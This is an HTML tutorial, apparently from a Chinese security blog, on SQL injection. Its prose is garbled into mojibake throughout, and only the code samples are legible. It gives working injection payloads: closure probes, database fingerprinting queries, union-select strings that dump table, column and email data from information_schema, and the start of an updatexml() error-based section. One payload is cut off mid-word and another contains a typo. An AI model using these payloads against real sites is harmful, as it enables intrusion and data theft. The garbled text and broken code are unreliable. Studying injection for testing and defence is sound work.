<p>SQL Ê≥®ÂÖ•ÊòØÂõ†‰∏∫ÂâçÁ´ØËæìÂÖ•ÊéßÂà∂‰∏ç‰∏•Ê†ºÈÄ†ÊàêÁöÑÊºèÊ¥ûÔºå‰ΩøÂæóÊîªÂáªËÄÖÂèØ‰ª•ËæìÂÖ•ÂØπÂêéÁ´ØÊï∞ÊçÆÂ∫ìÊúâÂç±ÂÆ≥ÁöÑÂ≠óÁ¨¶‰∏≤ÊàñÁ¨¶Âè∑Ôºå‰ΩøÂæóÂêéÁ´ØÊï∞ÊçÆÂ∫ì‰∫ßÁîüÂõûÊòæÊàñÊâßË°åÂëΩ‰ª§Ôºå‰ªéËÄåÂÆûÁé∞ÂØπ‰∫éÊï∞ÊçÆÂ∫ìÊàñÁ≥ªÁªüÁöÑÂÖ•‰æµÔºõ‰ªéÊîªÂáªËÄÖËßíÂ∫¶Êù•ÁúãÔºåÈúÄË¶ÅÊãºÊé•Âá∫ÂèØ‰ª•‰ΩøÂêéÁ´ØËØÜÂà´Âπ∂ÂìçÂ∫îÁöÑ SQL ÂëΩ‰ª§Ôºå‰ªéËÄåÂÆûÁé∞ÊîªÂáª</p>
<h3 id="Â∏∏ËßÅ‰ΩçÁΩÆ"><a class="markdownIt-Anchor" href="#Â∏∏ËßÅ‰ΩçÁΩÆ"></a> Â∏∏ËßÅ‰ΩçÁΩÆ</h3>
<ol>
<li>URLÂèÇÊï∞ÔºöÊîªÂáªËÄÖÂèØ‰ª•Âú®Â∫îÁî®Á®ãÂ∫èÁöÑ URL ÂèÇÊï∞‰∏≠Ê≥®ÂÖ•ÊÅ∂ÊÑè SQL ‰ª£Á†ÅÔºå‰æãÂ¶ÇÂú®Êü•ËØ¢Â≠óÁ¨¶‰∏≤ÊàñË∑ØÂæÑ‰∏≠</li>
<li>Ë°®ÂçïËæìÂÖ•ÔºöÂ∫îÁî®Á®ãÂ∫è‰∏≠ÁöÑË°®ÂçïËæìÂÖ•Ê°ÜÔºåÂ¶ÇÁî®Êà∑Âêç„ÄÅÂØÜÁ†Å„ÄÅÊêúÁ¥¢Ê°ÜÁ≠âÔºåÂ¶ÇÊûúÊ≤°ÊúâËøõË°åÂÖÖÂàÜÁöÑËæìÂÖ•È™åËØÅÂíåËøáÊª§ÔºåÂ∞±ÂèØËÉΩÊàê‰∏∫ SQL Ê≥®ÂÖ•ÁöÑÁõÆÊ†á</li>
<li>CookieÔºöÂ¶ÇÊûúÂ∫îÁî®Á®ãÂ∫è‰ΩøÁî® Cookie Êù•Â≠òÂÇ®Áî®Êà∑‰ø°ÊÅØÊàñ‰ºöËØùÁä∂ÊÄÅÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøá‰øÆÊîπ Cookie ‰∏≠ÁöÑÂÄºÊù•ËøõË°å SQL Ê≥®ÂÖ•</li>
<li>HTTPÂ§¥ÈÉ®ÔºöÊúâ‰∫õÂ∫îÁî®Á®ãÂ∫èÂèØËÉΩ‰ºö‰ªé HTTP Â§¥ÈÉ®‰∏≠Ëé∑ÂèñÊï∞ÊçÆÔºåÊîªÂáªËÄÖÂèØ‰ª•Âú® HTTP Â§¥ÈÉ®‰∏≠Ê≥®ÂÖ•ÊÅ∂ÊÑè SQL ‰ª£Á†Å„ÄÇ</li>
<li>Êï∞ÊçÆÂ∫ìÊü•ËØ¢ËØ≠Âè•ÔºöÂú®Â∫îÁî®Á®ãÂ∫è‰∏≠Áõ¥Êé•ÊãºÊé• SQL Êü•ËØ¢ËØ≠Âè•ÁöÑÂú∞ÊñπÔºåÂ¶ÇÊûúÊ≤°ÊúâÊ≠£Á°ÆÂú∞ÂØπÁî®Êà∑ËæìÂÖ•ËøõË°åËøáÊª§ÂíåËΩ¨‰πâÔºåÂ∞±ÂèØËÉΩÂØºËá¥ SQL Ê≥®ÂÖ•ÊºèÊ¥û</li>
</ol>
<h3 id="ÂàÜÁ±ª"><a class="markdownIt-Anchor" href="#ÂàÜÁ±ª"></a> ÂàÜÁ±ª</h3>
<p>ÊåâÂèòÈáèÁ±ªÂûãÂàÜÔºöÊï∞Â≠óÂûãÂíåÂ≠óÁ¨¶Âûã</p>
<p>ÊåâHTTPÊèê‰∫§ÊñπÂºèÂàÜÔºöPOSTÊ≥®ÂÖ•„ÄÅGETÊ≥®ÂÖ•ÂíåCookieÊ≥®ÂÖ•</p>
<p>ÊåâÊ≥®ÂÖ•ÊñπÂºèÂàÜÔºöÂ∏ÉÂ∞îÊ≥®ÂÖ•„ÄÅËÅîÂêàÊ≥®ÂÖ•„ÄÅÂ§öËØ≠Âè•Ê≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•„ÄÅÂª∂Êó∂Ê≥®ÂÖ•„ÄÅÂÜÖËÅîÊ≥®ÂÖ•</p>
<p>ÊåâÊï∞ÊçÆÂ∫ìÁ±ªÂûãÂàÜÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">sqlÔºöoracle„ÄÅmysql„ÄÅmssql„ÄÅaccess„ÄÅsqlite„ÄÅpostgersql
nosqlÔºömongodb„ÄÅredis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="mysql‰∏émssqlÂèäaccessÂå∫Âà´"><a class="markdownIt-Anchor" href="#mysql‰∏émssqlÂèäaccessÂå∫Âà´"></a> MySQL‰∏éMSSQLÂèäACCESSÂå∫Âà´</h3>
<p>1.MySQL5.0‰ª•‰∏ãÊ≤°Êúâinformation_schemaËøô‰∏™ÈªòËÆ§Êï∞ÊçÆÂ∫ì</p>
<p>2.ACCESSÊ≤°ÊúâÂ∫ìÂêçÔºåÂè™ÊúâË°®ÂíåÂ≠óÊÆµÔºåÂπ∂‰∏îÊ≥®ÂÖ•Êó∂ÔºåÂêéÈù¢ÂøÖÈ°ªË∑üË°®ÂêçÔºåACCESSÊ≤°ÊúâÊ≥®Èáä</p>
<pre class="line-numbers language-none"><code class="language-none">‰∏æ‰æãÔºöselect 1,2,3 from &#96;table_name&#96; union select 1,2,3 from &#96;table_name&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>3.MySQL‰ΩøÁî®limitÊéíÂ∫èÔºåACCESS‰ΩøÁî®TOPÊéíÂ∫èÔºàTOPÂú®MSSQL‰πüÂèØ‰ΩøÁî®Ôºâ</p>
<h2 id="Âà©Áî®"><a class="markdownIt-Anchor" href="#Âà©Áî®"></a> Âà©Áî®</h2>
<h3 id="Âà§Êñ≠‰∏çÂêåÊï∞ÊçÆÂ∫ìÁöÑËØ≠Âè•"><a class="markdownIt-Anchor" href="#Âà§Êñ≠‰∏çÂêåÊï∞ÊçÆÂ∫ìÁöÑËØ≠Âè•"></a> Âà§Êñ≠‰∏çÂêåÊï∞ÊçÆÂ∫ìÁöÑËØ≠Âè•</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">MySQLÔºö<span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span>

ACCESSÔºö<span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">from</span> MSysAccessObjects<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span>

MSSQLÔºö<span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">from</span> sysobjects<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Âà§Êñ≠ÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#Âà§Êñ≠ÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•"></a> Âà§Êñ≠ÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ÂçïÂèåÂºïÂè∑Âà§Êñ≠
<span class="token operator">and</span> ÂûãÂà§Êñ≠
<span class="token operator">or</span> Êàñ <span class="token operator">xor</span> Âà§Êñ≠
exp<span class="token punctuation">(</span><span class="token number">709</span><span class="token punctuation">)</span> exp<span class="token punctuation">(</span><span class="token number">710</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Âà§Êñ≠Èó≠ÂêàÊñπÂºè"><a class="markdownIt-Anchor" href="#Âà§Êñ≠Èó≠ÂêàÊñπÂºè"></a> Âà§Êñ≠Èó≠ÂêàÊñπÂºè</h3>
<p>ÊñπÊ≥ï1ÔºöÂà©Áî®Êä•Èîô‰ø°ÊÅØ</p>
<p>ÊñπÊ≥ï2ÔºöÂ¶ÇÊûúÊ≤°ÊúâÊä•Èîô‰ø°ÊÅØ<br />
È¶ñÂÖàÂ∞ùËØïÔºö<br />
?id=1‚Äô<br />
?id=1‚Äù<br />
ÁªìÊûú‰∏ÄÔºöÂ¶ÇÊûúÈÉΩÊä•Èîô<br />
Âà§Êñ≠Èó≠ÂêàÁ¨¶‰∏∫ÔºöÊï¥ÂΩ¢Èó≠Âêà„ÄÇ</p>
<p>ÁªìÊûú‰∫åÔºöÂ¶ÇÊûúÂçïÂºïÂè∑Êä•ÈîôÔºåÂèåÂºïÂè∑‰∏çÊä•Èîô„ÄÇ<br />
ÁªßÁª≠Â∞ùËØï<br />
?id=1‚Äô ‚Äì-+<br />
ÁªìÊûú1ÔºöÊó†Êä•Èîô<br />
Âà§Êñ≠Èó≠ÂêàÁ¨¶‰∏∫ÔºöÂçïÂºïÂè∑Èó≠Âêà„ÄÇ<br />
ÁªìÊûú2ÔºöÊä•Èîô<br />
Âà§Êñ≠Èó≠ÂêàÁ¨¶ÂèØËÉΩ‰∏∫ÔºöÂçïÂºïÂè∑Âä†Êã¨Âè∑„ÄÇ</p>
<p>ÁªìÊûú‰∏âÔºöÂ¶ÇÊûúÂçïÂºïÂè∑‰∏çÊä•ÈîôÔºåÂèåÂºïÂè∑Êä•Èîô„ÄÇ<br />
ÁªßÁª≠Â∞ùËØï<br />
?id=1&quot; -‚Äì+<br />
ÁªìÊûú1ÔºöÁªìÊûúÊó†Êä•Èîô<br />
Âà§Êñ≠Èó≠ÂêàÁ¨¶‰∏∫ÔºöÂèåÂºïÂè∑Èó≠Âêà„ÄÇ<br />
ÁªìÊûú2ÔºöÊä•Èîô<br />
Âà§Êñ≠Èó≠ÂêàÁ¨¶ÂèØËÉΩ‰∏∫ÔºöÂèåÂºïÂè∑Âä†Êã¨Âè∑„ÄÇ</p>
<p>Ê≥®ÊÑèÔºöËøôÈáåÁöÑÊã¨Âè∑‰∏ç‰∏ÄÂÆöÂè™Êúâ‰∏Ä‰∏™ÔºåÈó≠ÂêàÁ¨¶ÈáåÊòØÂÖÅËÆ∏Â§ö‰∏™Êã¨Âè∑ÁªÑÂêàÊàêÈó≠ÂêàÁ¨¶ÁöÑÔºåÂÖ∑‰ΩìË¶ÅÂà§ÊÆµÊúâÂ§öÂ∞ë‰∏™Êã¨Âè∑ÔºåÂèØ‰ª•‰ΩøÁî®‰∫åÂàÜÊ≥ïÊù•Âø´ÈÄüÂà§Êñ≠„ÄÇ</p>
<h3 id="ËÅîÂêàÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#ËÅîÂêàÊ≥®ÂÖ•"></a> ËÅîÂêàÊ≥®ÂÖ•</h3>
<h4 id="step1Á±ªÂûãÂà§Êñ≠"><a class="markdownIt-Anchor" href="#step1Á±ªÂûãÂà§Êñ≠"></a> step1Á±ªÂûãÂà§Êñ≠</h4>
<p>È¶ñÂÖàÂà§Êñ≠ÊòØÂê¶Â≠òÂú®Ê≥®ÂÖ•ÔºåËã•Â≠òÂú®ÔºåÂàôÂà§Êñ≠ÊòØÂ≠óÁ¨¶ÂûãËøòÊòØÊï∞Â≠óÂûãÔºåÁÆÄÂçïÊù•ËØ¥Êï∞Â≠óÂûã‰∏çÈúÄË¶ÅÁ¨¶Âè∑ÂåÖËµ∑Êù•ÔºåËÄåÂ≠óÁ¨¶ÂûãÈúÄË¶Å</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Êï∞Â≠óÂûãÔºö<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span>$id
Â≠óÁ¨¶ÂûãÔºö<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'$id'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Âà§Êñ≠Á±ªÂûã‰∏ÄËà¨ÂèØ‰ª•Áî®<code>and</code>ÂûãÁªìÂêàÊ∞∏ÁúüÂºèÂíåÊ∞∏ÂÅáÂºè</p>
<p>Âà§Êñ≠Êï∞Â≠óÂûã</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1 and 1&#x3D;1 #Ê∞∏ÁúüÂºè   select * from table where id&#x3D;1 and 1&#x3D;1
1 and 1&#x3D;2 #Ê∞∏ÂÅáÂºè   select * from table where id&#x3D;1 and 1&#x3D;2
#Ëã•Ê∞∏ÂÅáÂºèËøêË°åÈîôËØØÔºåÂàôËØ¥ÊòéÊ≠§SQLÊ≥®ÂÖ•‰∏∫Êï∞Â≠óÂûãÊ≥®ÂÖ•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>Âà§Êñ≠Â≠óÁ¨¶Âûã</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>
<span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span>
<span class="token comment">#Ëã•Ê∞∏ÂÅáÂºèËøêË°åÈîôËØØÔºåÂàôËØ¥ÊòéÊ≠§SQLÊ≥®ÂÖ•‰∏∫Â≠óÁ¨¶ÂûãÊ≥®ÂÖ•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="step2Êü•Â≠óÊÆµ‰∏™Êï∞"><a class="markdownIt-Anchor" href="#step2Êü•Â≠óÊÆµ‰∏™Êï∞"></a> step2Êü•Â≠óÊÆµ‰∏™Êï∞</h4>
<p>‰ΩøÁî®<code>order by</code>Êü•ËØ¢Â≠óÊÆµ‰∏™Êï∞Ôºå‰∏ä‰∏ÄÊ≠•Êàë‰ª¨Â∑≤ÁªèÂà§Êñ≠Âá∫‰∫ÜÊòØÂ≠óÁ¨¶ÂûãËøòÊòØÊï∞Â≠óÂûã,‰πüÂ∞±ÊòØËØ¥ËøôÈáåÊàë‰ª¨Â∑≤ÁªèÊûÑÂª∫‰∫Ü‰∏Ä‰∏™Âü∫Êú¨ÁöÑÊ°ÜÊû∂(ËøôÊòØ‰∏Ä‰∏™Ê≥®ÂÖ•ÁÇπ)</p>
<blockquote>
<p>Ê≥®ÈáäÁöÑ‰ΩøÁî®</p>
<ul>
<li><code>#</code>Ôºö‰∏çÂª∫ËÆÆÁõ¥Êé•‰ΩøÁî®Ôºå‰ºöË¢´ÊµèËßàÂô®ÂΩìÂÅö URL ÁöÑ‰π¶Á≠æÔºåÂª∫ËÆÆ‰ΩøÁî®ÂÖ∂ URL ÁºñÁ†ÅÂΩ¢Âºè<code>%23</code></li>
<li><code>--+</code>ÔºöÊú¨Ë¥®‰∏äÊòØ<code>--Á©∫Ê†º</code>Ôºå<code>+</code>‰ºöË¢´ÊµèËßàÂô®Ëß£Èáä‰∏∫Á©∫Ê†ºÔºå‰πüÂèØ‰ª•‰ΩøÁî® URL ÁºñÁ†ÅÂΩ¢Âºè<code>--%20</code></li>
<li><code>/**/</code>ÔºöÂ§öË°åÊ≥®ÈáäÔºåÂ∏∏Ë¢´Áî®‰ΩúÁ©∫Ê†º</li>
</ul>
</blockquote>
<p>ÈöèÂêéÊàë‰ª¨Áî®<code>#(%23)</code>Â∞ÜÂêéÈù¢ÁöÑËØ≠Âè•ÁªôÊ≥®ÈáäÊéâÔºåÂ∞±ÂΩ¢Êàê‰∫Ü‰∏Ä‰∏™Ê°ÜÊû∂ÔºåÂêéÁª≠ÁöÑÊâÄÊúâÂÜÖÂÆπÂè™‰ºöÂú®Ê°ÜÊû∂ÈáåËøõË°åÂæÆË∞É</p>
<p>‰πãÂêéÊàë‰ª¨Âú®Ê°ÜÊû∂‰∏≠‰ΩøÁî®<code>order by Êï∞Â≠ó</code>Êù•Êü•ËØ¢Â≠óÊÆµÁöÑ‰∏™Êï∞ÔºåËøôÈáåÁöÑÂÖ≥ÈîÆÊòØÊâæÂà∞<strong>‰∏¥ÁïåÂÄº</strong>Ôºå‰æãÂ¶Ç<code>order by 4</code>Êó∂ÂÄôËøòÂú®Êä•ÈîôÔºå‰ΩÜÊòØ<code>order by 3</code>Êó∂Ê≤°ÊúâÂá∫Áé∞Êä•ÈîôÔºå3 Â∞±ÊòØËøôÈáåÁöÑ‰∏¥ÁïåÂÄºÔºåËØ¥ÊòéËøôÈáåÂ≠òÂú® 3 ‰∏™Â≠óÊÆµ</p>
<h4 id="step3Êü•ÊâæÊòæÁ§∫‰Ωç"><a class="markdownIt-Anchor" href="#step3Êü•ÊâæÊòæÁ§∫‰Ωç"></a> step3Êü•ÊâæÊòæÁ§∫‰Ωç</h4>
<p>‰ΩøÁî®<code>union select</code>Êü•ÊâæÊòæÁ§∫‰ΩçÔºå‰∏ä‰∏ÄÊ≠•Êàë‰ª¨Â∑≤ÁªèÁü•ÈÅì‰∫ÜÂ≠óÊÆµÁöÑÂÖ∑‰Ωì‰∏™Êï∞ÔºåÁé∞Âú®Êàë‰ª¨Ë¶ÅÂà§Êñ≠Ëøô‰∫õÂ≠óÊÆµÁöÑÂì™Âá†‰∏™‰ºöÂú®ÂâçÁ´ØÊòæÁ§∫Âá∫Êù•ÔºåËøô‰∫õÊòæÁ§∫Âá∫Êù•ÁöÑÂ≠óÊÆµÂè´ÂÅöÊòæÁ§∫‰ΩçÔºåÊàë‰ª¨‰ΩøÁî®<code>union select 1,2,3.....(Â≠óÊÆµ‰∏™Êï∞ÊòØÂ§öÂ∞ë‰∏™Â∞±ÂÜôÂà∞Âá†)</code>Êù•ÂØπ‰ΩçÁΩÆÁöÑÈ°∫Â∫èËøõË°åÂà§Êñ≠ÔºàÂÖ∂‰∏≠Êï∞Â≠ó‰ª£Ë°®ÊòØÂá†Âè∑ÊòæÁ§∫‰ΩçÔºâ</p>
<h4 id="step4ÁàÜÂ∫ìÂêç"><a class="markdownIt-Anchor" href="#step4ÁàÜÂ∫ìÂêç"></a> step4ÁàÜÂ∫ìÂêç</h4>
<p>‰ΩøÁî®<code>database()</code>ÂáΩÊï∞ÁàÜÂá∫Â∫ìÂêçÔºå<code>database()</code>ÂáΩÊï∞‰∏ªË¶ÅÊòØËøîÂõûÂΩìÂâçÔºàÈªòËÆ§ÔºâÊï∞ÊçÆÂ∫ìÁöÑÂêçÁß∞ÔºåËøôÈáåÊàë‰ª¨ÊääÂÆÉÁî®Âú®Âì™‰∏™ÊòæÁ§∫‰Ωç‰∏äÈÉΩÂèØ‰ª•</p>
<h4 id="step5ÁàÜË°®Âêç"><a class="markdownIt-Anchor" href="#step5ÁàÜË°®Âêç"></a> step5ÁàÜË°®Âêç</h4>
<p>Âü∫‰∫éÂ∫ìÂêç‰ΩøÁî®<code>table_name</code>ÁàÜÂá∫Ë°®ÂêçÔºåÂÖàÊù•‰ªãÁªç‰∏Ä‰∏ã‰ΩøÁî®Âà∞ÁöÑÂáΩÊï∞ÂíåÊï∞ÊçÆÊ∫êÔºö</p>
<ul>
<li><code>group_concat()</code>ÂáΩÊï∞Ôºö‰ΩøÊï∞ÊçÆÂú®‰∏ÄÂàó‰∏≠ËæìÂá∫</li>
<li><code>information_schema.tables</code>Êï∞ÊçÆÊ∫êÔºöÂ≠òÂÇ®‰∫ÜÊï∞ÊçÆË°®ÁöÑÂÖÉÊï∞ÊçÆ‰ø°ÊÅØÔºåÊàë‰ª¨‰∏ªË¶Å‰ΩøÁî®Ê≠§È°πÊï∞ÊçÆÊ∫ê‰∏≠ÁöÑ<code>table_name</code>Âíå<code>table_schema</code>Â≠óÊÆµ</li>
</ul>
<p>ÊúÄÁªàÂèØ‰ª•ÊûÑÈÄ†Âá∫ Payload Â¶Ç‰∏ãÔºåÂèØ‰ª•Ëé∑ÂèñÂà∞ emailsÔºåreferersÔºåuagentsÔºåusers ÂõõÂº†Ë°®</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="step6ÁàÜÂàóÂêç"><a class="markdownIt-Anchor" href="#step6ÁàÜÂàóÂêç"></a> step6ÁàÜÂàóÂêç</h4>
<p>Âü∫‰∫éË°®Âêç‰ΩøÁî®<code>column_name</code>ÁàÜÂá∫ÂàóÂêçÔºåÊ≠§Êó∂Êï∞ÊçÆÊ∫ê‰∏∫<code>information_schema.columns</code>Ôºå‰ΩçÁΩÆÂú®<code>table_name='Ë°®Âêç'(ËÆ∞ÂæóÁªôË°®ÂêçÂä†ÂçïÂºïÂè∑)</code></p>
<p>ÊúÄÁªàÊûÑÈÄ† Payload Â¶Ç‰∏ãÔºåÂèØ‰ª•Ëé∑ÂèñÂà∞ idÔºåemail_id ‰∏§‰∏™Â≠óÊÆµ</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span>? <span class="token operator">and</span> table_schma<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="step7ÁàÜ‰ø°ÊÅØ"><a class="markdownIt-Anchor" href="#step7ÁàÜ‰ø°ÊÅØ"></a> step7ÁàÜ‰ø°ÊÅØ</h4>
<p>‰ΩøÁî®ÂàóÂêçÁàÜÊïèÊÑü‰ø°ÊÅØÔºåÁõ¥Êé• from Ë°®ÂêçÂç≥ÂèØÔºåËøôÈáåÈúÄË¶Å‰ΩøÁî®<code>group_concat(concat_ws())</code>ÂÆûÁé∞Êï∞ÊçÆÁöÑÂÆåÊï¥ËØªÂèñÔºå<code>group_concat()</code>ÂáΩÊï∞Âú®ÂâçÈù¢Âá†Ê≠•Â∞±Êé•Ëß¶ËøáÔºå‰∏ªË¶ÅÊòØ‰ΩøÊï∞ÊçÆÂú®‰∏ÄÂàó‰∏≠ËæìÂá∫</p>
<p>ËøôÂ∞±Â∏¶Êù•‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ¶ÇÊûúÁõ¥Êé•ÊääÂàóÊîæÂÖ•<code>group_concat()</code>ÂáΩÊï∞ÔºåÂàóÈó¥ÁöÑÁïåÈôêÂ∞±‰∏çÊ∏ÖÊô∞‰∫ÜÔºå<code>concat_ws()</code>Â∞±ÊòØ‰∏∫‰∫ÜÂå∫ÂàÜÂàóÁöÑÁïåÈôêÊâÄ‰ΩøÁî®ÁöÑÔºåÂÖ∂ËØ≠Ê≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">concat_ws(&#39;Â≠óÁ¨¶&#39;,Â≠óÊÆµ1,Â≠óÊÆµ2,.....)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ÊúÄÁªàÊàë‰ª¨‰æøÂèØ‰ª•ÊûÑÈÄ†Âá∫Ëé∑ÂèñÊï∞ÊçÆÁöÑ PayloadÔºö</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,group_concat(concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>id<span class="token punctuation">,</span>email_id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ema<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Êä•ÈîôÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#Êä•ÈîôÊ≥®ÂÖ•"></a> Êä•ÈîôÊ≥®ÂÖ•</h3>
<p>Êä•ÈîôÊ≥®ÂÖ•ÁöÑÊú¨Ë¥®ÊòØ‰ΩøÁî®‰∏Ä‰∫õÊåáÂÆöÁöÑÂáΩÊï∞Âà∂ÈÄ†Êä•ÈîôÔºå‰ªéËÄå‰ªéÊä•Èîô‰ø°ÊÅØËé∑ÂæóÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂÜÖÂÆπÔºå‰ΩøÁî®ÂâçÊèêÊòØ<strong>ÂêéÂè∞Ê≤°ÊúâÂ±èËîΩÊï∞ÊçÆÂ∫ìÁöÑÊä•Èîô‰ø°ÊÅØÔºå‰∏îÊä•Èîô‰ø°ÊÅØ‰ºöËøîÂõûÂà∞ÂâçÁ´ØÔºåÊä•ÈîôÊ≥®ÂÖ•‰∏ÄËà¨Âú®Êó†Ê≥ïÁ°ÆÂÆöÊòæÁ§∫‰ΩçÁöÑÊó∂ÂÄô‰ΩøÁî®</strong>ÔºåÊàë‰ª¨ÂÖàÊù•‰∫ÜËß£‰∏Ä‰∏ãÊä•ÈîôÊ≥®ÂÖ•ÁöÑÁ±ªÂûãÂíå‰ºöÁî®Âà∞ÁöÑÂáΩÊï∞</p>
<h4 id="xpathÂØºËá¥ÁöÑÊä•Èîô"><a class="markdownIt-Anchor" href="#xpathÂØºËá¥ÁöÑÊä•Èîô"></a> xpathÂØºËá¥ÁöÑÊä•Èîô</h4>
<p><code>updatexml()</code>ÂáΩÊï∞Âíå<code>extractvalue()</code>ÂáΩÊï∞ÈÉΩÂèØ‰ª•ÂΩíÁ±ª‰∏∫ÊòØ XPath Ê†ºÂºè‰∏çÊ≠£Á°ÆÊàñÁº∫Â§±ÂØºËá¥Êä•ÈîôÁöÑÂáΩÊï∞</p>
<h5 id="updatexml"><a class="markdownIt-Anchor" href="#updatexml"></a> updatexml()</h5>
<p><code>updatexml()</code>ÂáΩÊï∞Êú¨Ë∫´ÊòØÊîπÂèò XML ÊñáÊ°£‰∏≠Á¨¶ÂêàÊù°‰ª∂ÁöÑÂÄºÔºåÂÖ∂ËØ≠Ê≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">updatexml(XML_document,XPath_string,new_value)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËØ≠Ê≥ï‰∏≠‰ΩøÁî®Âà∞‰ª•‰∏ã‰∏â‰∏™ÂèÇÊï∞</p>
<ul>
<li>
<p>XML_documentÔºöXML ÊñáÊ°£ÂêçÁß∞Ôºå‰ΩøÁî® String Ê†ºÂºè‰Ωú‰∏∫ÂèÇÊï∞</p>
</li>
<li>
<p>XPath_stringÔºöË∑ØÂæÑÔºåXPath Ê†ºÂºèÔºå<code>updatexml()</code>ÂáΩÊï∞Â¶ÇÊûú<strong>ËøôÈ°πÂèÇÊï∞ÈîôËØØ‰æø‰ºöÂØºËá¥Êä•ÈîôÔºåÊàë‰ª¨‰∏ªË¶ÅÂà©Áî®ÁöÑ‰πüÊòØËøô‰∏™ÂèÇÊï∞</strong></p>
</li>
<li>
<p>new_valueÔºöÊõøÊç¢ÂêéÁöÑÂÄºÔºå‰ΩøÁî® String Ê†ºÂºè‰Ωú‰∏∫ÂèÇÊï∞</p>
</li>
<li>
<p><code>select * from test where ide = 1 and (updatexml(1,0x7e,3)); </code>Áî±‰∫é0x7eÊòØ~Ôºå‰∏çÂ±û‰∫éxpathËØ≠Ê≥ïÊ†ºÂºèÔºåÂõ†Ê≠§Êä•Âá∫xpathËØ≠Ê≥ïÈîôËØØ„ÄÇ</p>
</li>
</ul>
<h5 id="extractvalue-ÂáΩÊï∞"><a class="markdownIt-Anchor" href="#extractvalue-ÂáΩÊï∞"></a> extractvalue() ÂáΩÊï∞</h5>
<p><code>extractvalue()</code>ÂáΩÊï∞Êú¨Ë∫´Áî®‰∫éÂú® XML ÊñáÊ°£‰∏≠Êü•ËØ¢ÊåáÂÆöÂ≠óÁ¨¶ÔºåËØ≠Ê≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">extractvalue(XML_document,xpath_string)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËØ≠Ê≥ï‰∏≠‰ΩøÁî®Âà∞‰ª•‰∏ã‰∏§‰∏™ÂèÇÊï∞</p>
